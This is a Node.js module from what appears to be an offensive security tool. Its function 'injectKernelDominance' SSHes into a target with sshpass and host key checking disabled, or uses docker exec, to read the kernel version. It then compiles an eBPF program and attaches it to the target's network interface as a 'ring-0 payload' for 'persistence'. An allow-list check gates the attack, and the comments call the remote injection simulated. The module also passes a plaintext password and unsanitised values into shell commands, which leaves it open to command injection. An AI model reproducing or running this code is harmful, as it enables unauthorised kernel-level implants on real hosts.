const { exec } = require('child_process');
const util = require('util');
const path = require('path');
const execPromise = util.promisify(exec);
const { isAllowedTarget } = require('../security/securityGovernor');

const injectKernelDominance = async (targetIp, sshCredentials, compassContext = null) => {
    console.log(`\n[💉] PHASE 9.5: Initiating Kernel Dominance Injection on ${targetIp}...`);

    // The Context Compass
    if (compassContext) {
        console.log(`[🧭] COMPASS ACQUIRED: Agent environment mapped.`);
        console.log(`    Local: ${compassContext.currentEnvironment}`);
        console.log(`    Target: ${compassContext.targetEnvironment}`);
    }

    if (!isAllowedTarget(targetIp)) {
        console.log(`[🛑] INJECTION ABORTED: Governor Lockout.`);
        return { success: false, reason: 'Governor Lockout' };
    }

    try {
        // Step 1: Probe Environment (Simulated via local mock if no SSH, or direct exec if local target)
        // In a real offensive scenario, this uses the established Breacher session.
        console.log(`[🔍] Probing target environment...`);
        let kernelVersion = '';
        try {
            if (compassContext && compassContext.targetEnvironment === 'docker') {
                const { stdout } = await execPromise(`docker exec ${compassContext.targetContainer} uname -r`, { timeout: 10000 });
                kernelVersion = stdout.trim();
            } else {
                const { stdout } = await execPromise(`sshpass -p ${sshCredentials.password} ssh -o StrictHostKeyChecking=no ${sshCredentials.user}@${targetIp} "uname -r"`, { timeout: 10000 });
                kernelVersion = stdout.trim();
            }
        } catch (e) {
            console.log(`[⚠️] Probe failed: ${e.message}. Attempting fallback...`);
            if (compassContext && compassContext.targetEnvironment === 'docker') {
               const { stdout } = await execPromise(`docker exec ${compassContext.targetContainer} sh -c "uname -r"`);
               kernelVersion = stdout.trim();
            } else {
               const { stdout } = await execPromise(`uname -r`);
               kernelVersion = stdout.trim();
            }
        }
        
        console.log(`[🎯] Target Kernel Version: ${kernelVersion}`);

        // Step 2: Adapt and Compile the Neural Engine
        const ebpfPath = path.join(__dirname, 'ebpf_module', 'ebpf_neural_net.c');
        const objPath = path.join(__dirname, 'ebpf_module', `ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o`);
        
        console.log(`[🔨] Compiling NEE specifically for Kernel ${kernelVersion}...`);
        
        // This simulates injecting dynamic macros based on the kernel version
        let compileCmd = '';
        const isWindowsHost = process.platform === 'win32';
        
        if (compassContext && compassContext.targetEnvironment === 'docker') {
             if (isWindowsHost) {
                 // Force compilation through the docker engine via the mounted volume
                 compileCmd = `docker exec ${compassContext.targetContainer} clang -O2 -target bpf -D_KERNEL_VERSION="${kernelVersion}" -c "/ebpf_module/ebpf_neural_net.c" -o "/ebpf_module/ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o"`;
             } else {
                 compileCmd = `docker exec ${compassContext.targetContainer} clang -O2 -target bpf -D_KERNEL_VERSION="${kernelVersion}" -c "/ebpf_module/ebpf_neural_net.c" -o "/ebpf_module/ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o"`;
             }
        } else {
             compileCmd = `clang -O2 -target bpf -D_KERNEL_VERSION="${kernelVersion}" -c "${ebpfPath}" -o "${objPath}"`;
        }
        await execPromise(compileCmd);
        
        console.log(`[✅] NEE Compiled Successfully.`);

        // Step 3: Inject eBPF Neural Engine (Simulated remote injection)
        console.log(`[🚀] Deploying payload to ring-0...`);
        // If this was remote, we would SCP the .o file and run bpftool on the target.
        // For local simulation, we just load it locally to test the persistence logic.
        const defaultInterface = "eth0"; // Assumed standard for test
        
        // Unload old, load new
        if (compassContext && compassContext.targetEnvironment === 'docker') {
            // Execute the load command inside the container using the compiled object from the volume
            await execPromise(`docker exec ${compassContext.targetContainer} ip link set dev ${defaultInterface} xdpgeneric off`).catch(() => {});
            await execPromise(`docker exec ${compassContext.targetContainer} ip link set dev ${defaultInterface} xdpgeneric obj "/ebpf_module/ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o" sec xdp_drop`);
        } else {
            await execPromise(`sudo ip link set dev ${defaultInterface} xdpgeneric off`).catch(() => {});
            await execPromise(`sudo ip link set dev ${defaultInterface} xdpgeneric obj "${objPath}" sec xdp_drop`);
        }
        
        console.log(`[👑] PERSISTENCE ACHIEVED: eBPF Neural Engine injected into ${targetIp}.`);
        
        return { success: true, kernel: kernelVersion, interface: defaultInterface };

    } catch (error) {
        console.error(`[❌] Kernel Dominance Failed:`, error.message);
        return { success: false, reason: error.message };
    }
};

module.exports = { injectKernelDominance };
